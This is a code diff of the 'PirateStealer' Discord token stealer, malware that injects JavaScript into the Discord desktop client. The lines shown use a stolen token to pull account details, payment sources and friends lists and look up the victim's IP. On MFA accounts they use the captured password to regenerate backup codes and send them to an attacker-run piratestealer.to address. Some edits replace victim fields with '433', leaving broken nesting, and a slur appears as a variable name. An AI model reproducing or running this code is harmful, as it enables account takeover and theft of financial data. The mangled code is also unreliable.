@@ -172,62 +172,7 @@ function GetBadges(flags) {
 	return badges
 }
 
-function Login(email, password, token) {
-	const window = BrowserWindow.getAllWindows()[0];
-	window.webContents.executeJavaScript(`
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send( null );
-    xmlHttp.responseText;`, !0).then((info) => {
-		window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
-			window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-        xmlHttp.setRequestHeader("Authorization", "${token}");
-        xmlHttp.send( null );
-        xmlHttp.responseText`, !0).then((info3) => {
-				window.webContents.executeJavaScript(`
-            var xmlHttp = new XMLHttpRequest();
-            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
-            xmlHttp.setRequestHeader("Authorization", "${token}");
-            xmlHttp.send( null );
-            xmlHttp.responseText`, !0).then((info4) => {
-
-					if (token.startsWith("mfa")) {
-						window.webContents.executeJavaScript(`
-              var xmlHttp = new XMLHttpRequest();
-              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
-              xmlHttp.setRequestHeader('Content-Type', 'application/json');
-              xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":true}));
-              xmlHttp.responseText`, !0).then((codes) => {
-
-							var fieldo = [];
-							var baseuri = "https://premium.piratestealer.to/raw/"
-
-
-							var gayass = JSON.parse(codes)
-
-							let g = gayass.backup_codes
-							const r = g.filter((code) => {
-								return code.consumed == null
-							})
-							for (let z in r) {
-								fieldo.push({
-									name: `Code`,
-									value: `\`${r[z].code.insert(4, "-")}\``,
-									inline: true
-								})
-								baseuri += `${r[z].code.insert(4, "-")}<br>`
-							}
-
-							function totalFriends() {
+function totalFriends() {
 								var f = JSON.parse(info4)
 								const r = f.filter((user) => {
 
@@ -273,6 +218,15 @@ function Login(email, password, token) {
 								}
 								return billing
 							}
+
+function Login(email, password, token) {
+	const window = BrowserWindow.getAllWindows()[0];
+	window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
 							const json = JSON.parse(info);
 
 							var params = {
@@ -284,15 +238,15 @@ function Login(email, password, token) {
 									"color": config['embed-color'],
 									"fields": [{
 										name: "Info",
-										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
+										value: `433`,
 										inline: !1
 									}, {
 										name: "Username",
-										value: `\`${json.username}#${json.discriminator}\``,
+										value: `433`,
 										inline: !0
 									}, {
 										name: "ID",
-										value: `\`${json.id}\``,
+										value: `433`,
 										inline: !0
 									}, {
 										name: "Nitro",
@@ -324,9 +278,6 @@ function Login(email, password, token) {
 									},
 									"footer": {
 										"text": "PirateStealer"
-									},
-									"thumbnail": {
-										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 									}
 								}, {
 									"title": `Total Friends (${totalFriends()})`,
@@ -444,15 +395,15 @@ function Login(email, password, token) {
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Info",
-													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
+													value: `433`,
 													inline: !1
 												}, {
 													name: "Username",
-													value: `\`${json.username}#${json.discriminator}\``,
+													value: `433`,
 													inline: !0
 												}, {
 													name: "ID",
-													value: `\`${json.id}\``,
+													value: `433`,
 													inline: !0
 												}, {
 													name: "Nitro",
@@ -484,9 +435,6 @@ function Login(email, password, token) {
 												},
 												"footer": {
 													"text": "PirateStealer"
-												},
-												"thumbnail": {
-													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 												}
 											}, {
 												"title": `Total Friends (${totalFriends()})`,
@@ -497,9 +445,6 @@ function Login(email, password, token) {
 												},
 												"footer": {
 													"text": "PirateStealer"
-												},
-												"thumbnail": {
-													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 												}
 											}]
 										}
